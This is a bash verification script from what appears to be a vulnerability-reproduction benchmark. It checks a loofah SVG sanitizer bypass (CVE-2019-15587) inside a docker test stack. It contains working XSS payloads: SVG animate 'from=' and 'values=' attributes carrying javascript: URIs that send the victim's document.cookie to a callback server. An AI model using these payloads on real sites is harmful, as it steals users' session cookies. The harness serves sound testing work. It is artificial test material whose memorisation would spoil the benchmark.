#!/usr/bin/env bash
# verify.sh --seed|--residual — loofah SVG animate republish XSS。
# seed: `<animate from=javascript:...>`（v0 存活执行 / v1 2.2.3 移除 from 被阻断）；
# residual: `<animate values=javascript:...>`（v1 仍存活执行）。
# 效果通道：victim 浏览器 cookie(PCB_FLAG) 经 javascript: URI post 到 callback -> /dump 含 RUN_FLAG。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }
_hostport() { dc port "$1" "$2" 2>/dev/null | awk -F: 'NR==1{gsub(/[[:space:]]/,"",$NF); print $NF}' || true; }

PORT="$(_hostport "$VERSION" 80)"
VICTIM_PORT="$(_hostport victim 8070)"
CB_PORT="$(_hostport callback 9000)"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT="${PORT_V0_0:-}" ;;
    v1) PORT="${PORT_V1_0:-}" ;;
    v2) PORT="${PORT_V2_0:-}" ;;
  esac
fi
VICTIM_PORT="${VICTIM_PORT:-${PORT_VICTIM_0:-}}"
CB_PORT="${CB_PORT:-${PORT_CALLBACK_0:-}}"
if [[ -z "$PORT" || -z "$VICTIM_PORT" || -z "$CB_PORT" ]]; then
  echo "verify: 端口解析失败 app=$PORT victim=$VICTIM_PORT callback=$CB_PORT (need --profile + compose.env)" >&2
  exit 20
fi
export PCB_APP_PORT="$PORT" PCB_VICTIM_PORT="$VICTIM_PORT" PCB_CB_PORT="$CB_PORT"
export PCB_TARGET_PORT="$PORT"
export PYTHONPATH="$CASE_DIR/poc${PYTHONPATH:+:$PYTHONPATH}"
export PCB_FLAG="${PCB_FLAG:-$RUN_FLAG}"

ready=0
for i in $(seq 1 90); do
  code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${PORT}/" || true)"
  vhealth="$(curl -s --max-time 5 "http://127.0.0.1:${VICTIM_PORT}/health" || true)"
  chealth="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${CB_PORT}/dump" || true)"
  if [[ "$code" == "200" && "$vhealth" == "ok" && "$chealth" == "200" ]]; then
    ready=1
    break
  fi
  # Seed/wrong/stale share one stack with no platform reset. A dead grid used to make residual rc=20.
  if [[ "$i" == "12" || "$i" == "30" ]]; then
    dc up -d --no-deps --pull never victim browser >/dev/null 2>&1 || true
  fi
  sleep 2
done
[[ "$ready" == 1 ]] || { echo "target not ready app=$PORT victim=$VICTIM_PORT cb=$CB_PORT vhealth=$vhealth" >&2; exit 20; }

OUT="$("$PY" - "$MODE" "$VERSION" <<'PYEOF'
import sys, json, os
sys.path.insert(0, os.environ.get("PYTHONPATH", "").split(":")[0] or ".")
from poc_common import run_payload, CB
mode, version = sys.argv[1], sys.argv[2]
if mode == '--seed':
    payload = ('<svg width="800" height="800">'
               '<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">'
               '<circle cx="200" cy="200" r="180" />'
               '<animate attributeName="xlink:href" begin="0" '
               "from=\"javascript:document.location='" + CB + "'+document.cookie\" to=\"x\" />"
               '</a></svg>')
else:
    # CVE-2019-15587: V1 removed only `from`; `values=` still allowlisted.
    payload = ('<svg width="800" height="800">'
               '<animate href="#foo" attributeName="href" '
               "values=\"javascript:document.location='" + CB + "'+document.cookie\" />"
               '<a id="foo"><circle cx="200" cy="200" r="180" /></a>'
               '</svg>')
dump = run_payload(payload, version, visit_mode='click')
print(json.dumps({'dump': str(dump)[:400]}))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
d = json.loads(sys.argv[1])
sys.exit(0 if '$RUN_FLAG' in d.get('dump', '') else 10)" "$OUT"
